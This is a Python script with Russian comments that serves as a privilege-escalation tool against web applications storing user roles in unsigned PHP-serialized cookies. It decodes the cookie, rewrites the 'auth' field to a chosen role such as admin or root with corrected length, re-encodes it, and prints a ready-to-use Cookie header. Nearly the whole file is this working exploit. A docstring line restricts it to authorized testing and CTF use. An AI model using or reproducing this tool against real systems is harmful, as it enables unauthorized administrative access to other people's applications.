"""
=============================================================================
 F_serialize_auth.py — подмена роли в PHP-сериализованной cookie (privesc)
=============================================================================

ЗАЧЕМ:
    Модифицирует токен-cookie, содержащий PHP-сериализованный объект, чтобы
    повысить привилегии. Пайплайн:
      1) decode_php_cookie() — URL-decode → base64-decode → сериализованная
         строка PHP (напр. a:...{s:4:"auth";s:4:"user";...});
      2) replace_auth_value() — регуляркой заменяет поле auth на нужную роль,
         КОРРЕКТНО пересчитывая длину строки s:<len>:"<role>" (иначе PHP
         отвергнет объект);
      3) encode_php_cookie() — обратно base64 → готовый токен для подстановки.

ГДЕ ПРИМЕНИМО:
    Приложение хранит роль пользователя в сериализованной cookie БЕЗ подписи/
    HMAC (доверяет клиентским данным). Классический обход авторизации /
    вертикальный privesc: user → admin/root.

ЗАПУСК:
    python3 F_serialize_auth.py
    → вставить текущий токен (base64/URL), указать новую роль (admin/root).
    Скрипт выдаёт готовую строку  Cookie: Access=<новый_токен>.

ЗАМЕЧАНИЯ:
    - Заменяет именно поле "auth"; под другое имя поля правьте regex.
    - Если cookie подписана/зашифрована — метод не сработает (нужен ключ).
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import base64
import re
import urllib.parse
banner = f"""
 _______         _______  _______  _______         _______          _________
(  ____ \       (  ____ \(  ____ \(  ____ )       (  ___  )|\     /|\__   __/
| (    \/       | (    \/| (    \/| (    )|       | (   ) || )   ( |   ) (   
| (__           | (_____ | (__    | (____)|       | (___) || |   | |   | |   
|  __)          (_____  )|  __)   |     __)       |  ___  || |   | |   | |   
| (                   ) || (      | (\ (          | (   ) || |   | |   | |   
| )             /\____) || (____/\| ) \ \__       | )   ( || (___) |   | |   
|/        _____ \_______)(_______/|/   \__/ _____ |/     \|(_______)   )_(   
         (_____)                           (_____)                           
"""
print(banner)
def decode_php_cookie(encoded_cookie):
    # URL-декодирование
    url_decoded = urllib.parse.unquote(encoded_cookie)
    # base64-декодирование
    decoded = base64.b64decode(url_decoded).decode('utf-8')
    return decoded

def encode_php_cookie(raw_string):
    return base64.b64encode(raw_string.encode('utf-8')).decode('utf-8')

def replace_auth_value(php_serialized_string, new_role):
    new_role_length = len(new_role)
    new_auth_field = f's:4:"auth";s:{new_role_length}:"{new_role}";'
    # Заменим поле auth (учитываем точную структуру сериализации)
    return re.sub(r's:4:"auth";s:\d+:"[^"]+";', new_auth_field, php_serialized_string)

def main():
    print("== PHP Serialized Cookie Modifier ==")
    encoded_cookie = input("[>] Вставь токен (base64, URL-кодированный): ").strip()

    try:
        decoded_cookie = decode_php_cookie(encoded_cookie)
    except Exception as e:
        print(f"[!] Ошибка при декодировании: {e}")
        return

    print("\n[+] Раскодировано (base64):")
    print(decoded_cookie)

    new_role = input("\n[?] На какую роль заменить 'auth'? (например, admin, root): ").strip()
    modified = replace_auth_value(decoded_cookie, new_role)

    print("\n[+] Новый сериализованный PHP-объект:")
    print(modified)

    reencoded_cookie = encode_php_cookie(modified)
    print("\n[+] Новый токен (base64):")
    print(reencoded_cookie)

    print("\n== Готовые команды для подмены ==")
    print(f"[1] Подставь в Cookie (base64):")
    print(f"Cookie: Access={reencoded_cookie}")

    print(f"\n[2] Декодированная версия (для понимания):")
    print(modified)

if __name__ == "__main__":
    main()

